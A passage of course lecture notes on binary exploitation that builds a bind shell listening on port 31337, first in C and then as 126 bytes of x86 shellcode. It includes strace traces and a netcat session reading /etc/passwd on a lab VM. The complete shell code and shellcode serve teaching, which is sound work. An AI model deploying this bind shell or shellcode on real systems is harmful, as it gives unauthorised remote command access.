do anything. We just opened it, but now we have to go about bind'ing the
socket to an address.

When we put this all together, the code to open a socket is:

``` c
//open new socket for server
server = socket(AF_INET, SOCK_STREAM, 0);
```

### =bind()=

A socket that is to be used as a server socket, that is, accept incoming
connections, must be bound to a network address. This is required
because some machines have multiple IP addresses, also called
multi-homed, and the OS must know which interface the socket is to be
associated with. The function definition is as follows:

``` c
 int bind(int sockfd, const struct sockaddr *addr,
                socklen_t addrlen);
```

The `sockfd` is the socket file descriptor to be bound. The `sockaddr`
reference `addr` is the address to be bound to, and the length argument
is the length of the socket address.

Here's where things get annoying with C sockets: Each different socket
type has a different address structure. You have to do a lot of annoying
casting and setup in order to get the right socket address set up and
passed to the `bind()` (and the `accept()`) function.

For `AF_INET` sockets, the relevant socket address is a `sockaddr_in`.
Which has the following members:

``` c
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
```

Two important points about the address structure: (1) note that the port
is stored in network byte order (not Little Endian) and we need to use
`htnos()` to cover the order, and this is also the same for the
`in_addr` portion; (2) there is a lot of padding in the structure, but
the core parts, sin<sub>family</sub>, sin<sub>port</sub> and
sin<sub>addr</sub> will be 2 + 2 + 4 or 8 bytes in size, and with the
padding of 8 bytes, the total structure is 16 bytes.

Initializing the server address and then binding to it looks like such:

``` c
 struct sockaddr_in host_addr;

 //set up server address
  memset(&(host_addr), '\0', sizeof(struct sockaddr_in));
  host_addr.sin_family=AF_INET;
  host_addr.sin_port=htons(31337);
  host_addr.sin_addr.s_addr=INADDR_ANY;

  //bind server socket
  if(bind(server, (struct sockaddr *) &host_addr, 
          sizeof(struct sockaddr)) < 0){
    perror("bind");
    return 1;
  }
```

There are a couple of things to take away from this process. We use the
`INADDR_ANY` flag to indicate that we are ok with the bind occurring on
"any" interface address. On most machines this is fine, but we might
want to bind to a particular address in the future and to do that we
would use `inet_addr()` or `inet_ntoa()` and etc to put address is
network byte order. Finally notes that `host_addr` must be cast to a
`sockaddr`.

### =listen()=

The `listen()` system call establishes that the socket is to be used for
incoming connections, i.e., as a server socket. `listen()` takes two
arguments:

``` c
int listen(int sockfd, int backlog);
```

The first argument is the socket file descriptor to act upon. The second
argument is the backlog which describes how many incoming connections
can be pending prior to their acceptance. This argument is often
confusing for programmers because it is not the number of client
connections possible, but rather how many connections can be processed
before accepting them. Consider that once a connection is accepted with
the accept() system call, a new socket is creatted for that connection.
At that point, the file descriptor resources have been allocated and
systems are already in place to handle that connection. However, prior
to that, there exists a small window where a client has connected to the
server socket but there has not been a new socket created for accepting
the connection. The backlog argument says how many such connections to
the server socket can exist during that small window. A typical value
for backlog is 4.

``` c
//set up listening queue
listen(server,4);
```

### =accept()=

The last piece of the puzzle is accepting an incoming connection from
the server socket to establish a new socket where you can communicate
with the client. The arguments for `accept()` are:

``` c
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

The first argument is the socket file descriptor, and the second
argument is a reference to a sockaddr which will be written to with the
remote address of the client. The third argument is a reference to a
size argument, which will store the size of the resulting argument. In
practice, this code will look like:

``` c
int server;
struct sockaddr_in client_addr;

socklen_t sin_size ; //store size

//size of incoming addresses
sin_size = sizeof(struct sockaddr_in);

//accept incoming connection
client = accept(server, (struct sockaddr *) &client_addr, &sin_size);
```

The accept system call returns a new file descriptor that refers to the
new socket for communication. It is important to remember that
`accept()` is a blocking system call: it will not return until an
incoming connection is made. This is much like the `read()` system call
on stdin, which will not return until user input is provided (or the
buffer is full).

At this point, the server has created a socket, bound the socket,
listened for incoming connection, and accepted the connection with a new
socket ready for reading and writing. The last thing to do use this to
create a remote shell

## Remote Shell in C

Consider for a second what is a remote shell? We use ssh a lot for our
remote shells, and it is a secure shell, but what does it really mean?

In it's most basic form, a remote shell is just a mechanism for us to
type on a terminal on the local machine and then send that input over
the network where it becomes the input to a shell running on the remote
machine. In the reverse direction, the results of running those commands
on the remote machine is written to standard output (and standard error)
and must then be transferred back over the network to the local machine
where they are written to the terminal. Visually this might look
something like this:

[![](file:imgs/remote-shell.png)](file:imgs/remote-shell.png)

Since we are writing the server side of this, consider what we might
want to do once an incoming connection is established. First, we have to
start executing `/bin/sh`, but we need `/bin/sh` to have the standard
file descriptors hooked up to the socket. The solution to that, is the
`dup2()` system call.

``` c
  //duplicate file descriptors for socket
  dup2(client, 0);
  dup2(client, 1);
  dup2(client, 2); 

  //execve shell
  char *args[2]={"/bin//sh", NULL};
  execve(args[0], args, NULL);
```

A socket is a two way file descriptor, unlike a pipe, so it can be read
and written to. It's perfectly fine to duplicate it on to the stadard
file descriptors. After the dup's all input/output/error from the
program is drector to/from the socket. The last thing to do is to
execute the shell which will inherent the file descriptor table, and
thus now the shell is using the socket for all communication with the
user. To connect the circuit, on a remote host, we connect to the serve.

``` c
//rsh.c
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
  int server, client; //server and client socket

  struct sockaddr_in host_addr, client_addr; //address structures
  socklen_t sin_size ; //store size
  int yes=1;

  //open new socket for server
  server = socket(AF_INET, SOCK_STREAM, 0);

  //set up server address
  memset(&(host_addr), '\0', sizeof(struct sockaddr_in));
  host_addr.sin_family=AF_INET;
  host_addr.sin_port=htons(31337);
  host_addr.sin_addr.s_addr=INADDR_ANY;

  //bind server socket
  if(bind(server, (struct sockaddr *) &host_addr, sizeof(struct sockaddr)) < 0){
    perror("bind");
    return 1;
  }

  //set up listening queue
  listen(server,4);

  //size of incoming addresses
  sin_size = sizeof(struct sockaddr_in);

  //accept incoming connection
  client = accept(server, (struct sockaddr *) &client_addr, &sin_size);


  //duplicate file descriptors for socket
  dup2(client, 0);
  dup2(client, 1);
  dup2(client, 2); 

  //execve shell
  char *args[2]={"/bin//sh", NULL};
  execve(args[0], args, NULL);

  return 0;
}
```

Now if I start the server on my local VM

``` example
user@si485H-base:demo$ ./rsh
```

On my host computer, I can connect over netcat, and then type
`cat /etc/passwd` and it will go give me what I desire!

``` example
[aviv@potbelly] 14 > netcat 192.168.56.101 31337
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
aviv:x:1001:1001:Adam Aviv,,,:/home/aviv:/bin/bash
```

# Assembly Based Remote Shells

## The `socketcall()` system call

\*The problem is: It's all been a lie!\*

It turns out that all the different system calls for sockets are not
real. There is actually only ONE system call. the `socketcall()`. Here's
the man page entry.

``` example
SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a common kernel entry point for the socket system calls.  call determines which socket function to invoke.  args points to a block containing the actual arguments, which are passed through to the appropriate
       call.

       User programs should call the appropriate functions by their usual names.  Only standard library implementors and kernel hackers need to know about socketcall().
```

We are kernel hackers, so let's go get'em. Parsing the arguments to
socketcall() there are two arguments, the call and the args. The call is
an integer identifier for the socket function required. These are
defined in the header file `net.h`:

``` example
user@si485H-base:demo$ grep SYS_ /usr/include/linux/net.h 
#define SYS_SOCKET  1       /* sys_socket(2)        */
#define SYS_BIND    2       /* sys_bind(2)          */
#define SYS_CONNECT 3       /* sys_connect(2)       */
#define SYS_LISTEN  4       /* sys_listen(2)        */
#define SYS_ACCEPT  5       /* sys_accept(2)        */
#define SYS_GETSOCKNAME 6       /* sys_getsockname(2)       */
#define SYS_GETPEERNAME 7       /* sys_getpeername(2)       */
#define SYS_SOCKETPAIR  8       /* sys_socketpair(2)        */
#define SYS_SEND    9       /* sys_send(2)          */
#define SYS_RECV    10      /* sys_recv(2)          */
#define SYS_SENDTO  11      /* sys_sendto(2)        */
#define SYS_RECVFROM    12      /* sys_recvfrom(2)      */
#define SYS_SHUTDOWN    13      /* sys_shutdown(2)      */
#define SYS_SETSOCKOPT  14      /* sys_setsockopt(2)        */
#define SYS_GETSOCKOPT  15      /* sys_getsockopt(2)        */
#define SYS_SENDMSG 16      /* sys_sendmsg(2)       */
#define SYS_RECVMSG 17      /* sys_recvmsg(2)       */
#define SYS_ACCEPT4 18      /* sys_accept4(2)       */
#define SYS_RECVMMSG    19      /* sys_recvmmsg(2)      */
#define SYS_SENDMMSG    20      /* sys_sendmmsg(2)      */
```

The arguments is a array of the arguments that that socket function
takes. Putting this together, we can convert our call to `socket()` to a
`socketcall()` like so:

``` c

  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <linux/net.h>


  int main(void){
    int server, client; //server and client socket

    //socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    unsigned int socket_args[] = {AF_INET,SOCK_STREAM,0};
    server = socketcall(SYS_SOCKET, (long *) socket_args);

    //...
  }
```

But there's a problem. If we try to compile this code:

``` example
user@si485H-base:demo$ make
gcc -fno-stack-protector -z execstack -Wno-format-security -g    socketcall-example.c   -o socketcall-example
/tmp/ccPCoZSR.o: In function `main':
/home/user/git/si485-binary-exploits/lec/15/demo/socketcall-example.c:15: undefined reference to `socketcall'
collect2: error: ld returned 1 exit status
make: *** [socketcall-example] Error 1
```

The `socketcall()` system call is not actually defined as an entry point
in libc. We have to write our own entry point using `syscall`:

``` c
#include <sys/syscall.h>

int socketcall(int call, long * args){
  int res;
  res = syscall(SYS_socketcall, call, args);
}
```

Add that to the code, we can now compile, and convert the rest of our
remote shell to `socketcalls()`

``` c
//socketcall-rsh.c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/net.h>
#include <sys/syscall.h>

int socketcall(int call, long * args){
  int res;
  res = syscall(SYS_socketcall, call, args);
}


int main(void){
  int server, client; //server and client socket
  struct sockaddr_in host_addr, client_addr; //address structures
  socklen_t sin_size ; //store size

  //socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
  int socket_args[] = {AF_INET,SOCK_STREAM,0};
  server = socketcall(SYS_SOCKET, (long *) socket_args);

  //set up server address
  memset(&host_addr, '\0', sizeof(struct sockaddr_in));
  host_addr.sin_family=AF_INET;
  host_addr.sin_port=htons(31337);
  host_addr.sin_addr.s_addr=INADDR_ANY;

  //bind
  int bind_args[] = {server, (int) &host_addr, sizeof(struct sockaddr)};
  socketcall(SYS_BIND, (long *) bind_args);

  //set up listening queue
  int listen_args[] = {server, 4};
  socketcall(SYS_LISTEN, (long *) listen_args);


  sin_size = sizeof(struct sockaddr_in);

  //accept incoming connection
  int accept_args[] = {server, (int) &client_addr, (int) &sin_size};
  client = socketcall(SYS_ACCEPT, (long *) accept_args);
  client = accept(server, (struct sockaddr *) &client_addr, &sin_size);


  //duplicate file descriptors for socket
  dup2(client, 0);
  dup2(client, 1);
  dup2(client, 2); 

  //execve shell
  char *args[2]={"/bin//sh", NULL};
  execve(args[0], args, NULL);

  return 0;
}
```

And if we run it through strace which will show us all the arguments to
the system's call, we find that, yes, everything is as it should be:

``` example
user@si485H-base:demo$ strace ./socketcall-rsh
execve("./socketcall-rsh", ["./socketcall-rsh"], [/* 20 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
(...)
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 4)                            = 0
accept(3, ...
```

## Converting Remote Shell to Assembly

Now that everything is converted to `socketcall()`'s, we are still not
done because we have consider how we might want to construct each of the
system calls in assembly. This is actually pretty straight forward.
Let's step through each of the parts:

### =socket()= in assembly

The first task is to call `socket()` using `socketcall()` in assembly.
Here's the code in C.

``` c
  //socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
  int socket_args[] = {AF_INET,SOCK_STREAM,0};
  server = socketcall(SYS_SOCKET, (long *) socket_args);
```

The values of `socket_args[]` is (2,1,0), which we can see in this
simple program.

``` c
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/net.h>


int main(){

  printf("PF_INET:%d\n", PF_INET);
  printf("SOCK_STREAM:%d\n", SOCK_STREAM);
  printf("IPPROTO_IP:%d\n",IPPROTO_IP);

}
```

``` example
user@si485H-base:demo$ ./socket_args 
PF_INET:2
SOCK_STREAM:1
IPPROTO_IP:0
```

We also know that SYS<sub>SOCKET</sub> is value 1, so we can follow the
assembly code:

``` asm

        ;; opening the socket                                                           
        xor eax,eax
        push eax
        push 0x1
        push 0x2
        mov ecx,esp             ;socket_args                                            

        xor ebx,ebx
        inc ebx                 ;SYS_SOCKET                                             

        mov al,0x66             ;SYS_SOCKETCALL                                         

        int 0x80
```

And with strace, we can see that we got what we wanted:

``` example
user@si485H-base:demo$ strace ./open_socket 
execve("./open_socket", ["./open_socket"], [/* 20 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x3} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

### =bind()= in assembly

In c, we have:

``` c
//set up server address
  memset(&host_addr, '\0', sizeof(struct sockaddr_in));
  host_addr.sin_family=AF_INET;
  host_addr.sin_port=htons(31337);
  host_addr.sin_addr.s_addr=INADDR_ANY;

  //bind
  int bind_args[] = {server, (int) &host_addr, sizeof(struct sockaddr)};
  socketcall(SYS_BIND, (long *) bind_args);
```

We know the value of SYS<sub>BIND</sub>, that's 2, but we need to think
more about the `host_addr` portion of the address space. Fortunately, we
can recall the structure from last lesson:

``` c
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
```

We see that we have two shorts, followed by the address. But, the
address we care about is `INNETADDR_ANY` which is 0. The rest is just
padding.

So another way to think about this is that the `struct sockaddr_in` is
the same as an array of four shorts:

``` c
short host_addr[] = {0x0002,0x697a,0x00000,0x0000};
```

Note that 0x697a is 31337 in big-endian(!) and we always need to be
careful about that with networking.

We can write code to produce the `host_addr` like so:

``` asm

    xor eax,eax
    push eax        ;0,0
    push WORD 0x697a    ;htonos(31337)
    push WORD 0x02      ;2
    mov ecx,esp
```

This assembly is also introducing a new form of push that will only push
a word onto the stack. This misaligns the stack, but it is a useful
tool.

Now we can setup the rest of the code like so:

``` asm
    xor eax,eax
    push eax        ;0,0
    push WORD 0x697a    ;htonos(31337)
    push WORD 0x02      ;2
    mov ecx,esp



    push 0x16       ;sizeof(host_addr)
    push ecx        ;host_addr
    push esi        ;assume esi stores socketfd

    xor ebx,ebx
    mov bl,0x2      ;SYS_BIND

    mov ecx,esp     ;socket_args

    mov al,0x66     ;SYS_SOCKETCALL
    int 0x80
```

And if we run it under strace, we see that it does call bind:

``` example
user@si485H-base:demo$ strace ./bind_socket 
execve("./bind_socket", ["./bind_socket"], [/* 20 vars */]) = 0
bind(0, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 22) = -1 ENOTSOCK (Socket operation on non-socket)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffa8} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

### =listen()= in assembly

The next socketcall() is perhaps the easiest: `listen()`.

``` c
//set up listening queue
  int listen_args[] = {server, 4};
  socketcall(SYS_LISTEN, (long *) listen_args);
```

There is only one argument to deal with, and we can quickly do the
conversion like so.

``` asm
tart:
    xor ecx,ecx
    mov cl,0x5

    push ecx        ;5
    push esi        ;socketfd

    mov ecx, esp        ;socket_args = {5,socketfd}

    xor ebx,ebx
    mov bl, 0x4     ;SYS_LISTEN

    xor eax,eax
    mov al,0x66     ;SYS_SOCKETCALL
    int 0x80
```

``` example
user@si485H-base:demo$ strace ./listen_socket 
execve("./listen_socket", ["./listen_socket"], [/* 20 vars */]) = 0
listen(0, 5)                            = -1 ENOTSOCK (Socket operation on non-socket)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffa8} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

### =accept()= in assembly

Turns out, that accept is also pretty easy. In C, we have this:

``` c
sin_size = sizeof(struct sockaddr_in);

  //accept incoming connection
  int accept_args[] = {server, (int) &client_addr, (int) &sin_size};
  client = socketcall(SYS_ACCEPT, (long *) accept_args);
```

But, we don't really care about the client's address, so we can set that
to NULL (or 0), which means that the next argument, the size, is also 0.
That means our socket argument is: `{ socketfd, 0, 0}`. In assembly, we
get the following:

``` asm
section .text
    global _start

_start:
    xor ecx,ecx
    push ecx        ; 0
    push ecx        ; 0
    push esi        ; socketfd
    mov ecx,esp     ;socket_args = {socketfd,0,0}

    xor ebx,ebx
    mov bl, 0x5     ;SYS_LISTEN

    xor eax,eax
    mov al,0x66     ;SYS_SOCKETCALL
    int 0x80
```

``` example
execve("./accept_socket", ["./accept_socket"], [/* 20 vars */]) = 0
accept(0, 0, NULL)                      = -1 ENOTSOCK (Socket operation on non-socket)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffa8} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

### =dup2()= in assembly

Finally, to move away fro the domain of networking, we have to the
dup2() system calls. This is much like the standard system calls we've
been doing so far. The system call number for dup2() is 0x3f. That
leaves us with the following code assembly for dup2() if we assume `esi`
stores our sockfd:

``` asm

          mov ebx,esi             ;sockfd
          xor ecx,ecx             ;stdin 0


          xor eax,eax
          mov al, 0x3f
          int 0x80

          inc ecx                 ;stdout 1
          xor eax,eax
          mov al, 0x3f
          int 0x80

          inc ecx                 ;stderr 2
          xor eax,eax
          mov al, 0x3f
          int 0x80
```

## Putting it all together

Now that we have all the parts, we can look at the entire assembly that
actually goes ahead and executes a remote shell:

``` asm
section .text
    global _start

_start:

    ;; socket()
    xor eax,eax
    push eax
    push 0x1
    push 0x2
    mov ecx,esp         ;socket_args

    xor ebx,ebx
    inc ebx         ;SYS_SOCKET

    mov al,0x66     ;SYS_SOCKETCALL

    int 0x80

    mov esi,eax     ;save sockfd in esi

    ;;bind()
    xor eax,eax
    push eax        ;0,0
    push WORD 0x697a    ;htonos(31337)
    push WORD 0x02      ;2
    mov ecx,esp

    push 0x16       ;sizeof(host_addr)
    push ecx        ;host_addr
    push esi        ;assume esi stores socketfd

    xor ebx,ebx
    mov bl,0x2      ;SYS_BIND

    mov ecx,esp     ;socket_args

    mov al,0x66     ;SYS_SOCKETCALL
    int 0x80

    ;; listen()
    xor ecx,ecx
    mov cl,0x5

    push ecx        ;5
    push esi        ;socketfd

    mov ecx, esp        ;socket_args = {5,socketfd}

    xor ebx,ebx
    mov bl, 0x4     ;SYS_LISTEN

    xor eax,eax
    mov al,0x66     ;SYS_SOCKETCALL
    int 0x80

    ;; accept()
    xor ecx,ecx
    push ecx        ; 0
    push ecx        ; 0
    push esi        ; socketfd
    mov ecx,esp     ;socket_args = {socketfd,0,0}

    xor ebx,ebx
    mov bl, 0x5     ;SYS_LISTEN

    xor eax,eax
    mov al,0x66     ;SYS_SOCKETCALL
    int 0x80

    mov esi,eax     ;new accepted socket stored in esi

    ;; dup2()
    mov ebx,esi     ;sockfd
    xor ecx,ecx     ;stdin 0


    xor eax,eax
    mov al, 0x3f
    int 0x80

    inc ecx         ;stdout 1
    xor eax,eax
    mov al, 0x3f
    int 0x80

    inc ecx         ;stderr 2
    xor eax,eax
    mov al, 0x3f
    int 0x80

    ;; execve()
    xor ecx,ecx
    mul ecx
    push ecx        ; null terminator
    push 0x68732f2f     ; /bin/sh
    push 0x6e69622f
    mov ebx,esp
    mov al, 0xb 
    int 0x80
```

``` example
user@si485H-base:demo$ strace ./assembly_rsh
execve("./assembly_rsh", ["./assembly_rsh"], [/* 20 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 22) = 0
listen(3, 5)                            = 0
accept(3, ...
```

Then I can connect remotely:

``` example
[aviv@potbelly] 15 >netcat 192.168.56.101 31337
```

Which will cause the accept() to complete:

``` example
(...)
accept(3, 0, NULL)                      = 4
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin//sh", [0], [/* 0 vars */]) = 0
```

And on the remote server, I can now do as I please:

``` example
[aviv@potbelly] 15 >netcat 192.168.56.101 31337
cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
aviv:x:1001:1001:Adam Aviv,,,:/home/aviv:/bin/bash
```

### This is some large shell code

This shell code is significantly bigger than anything we've seen so far.
That's because it takes a lot of effort of effort to open a remote
shell. Right now, we are at 126 bytes.

``` example
user@si485H-base:demo$ printf `./hexify.sh assembly_rsh` | wc -c
126
```

That's just too big. Let's see where we can reduce in size ... or maybe
that is something you should do in a lab :)

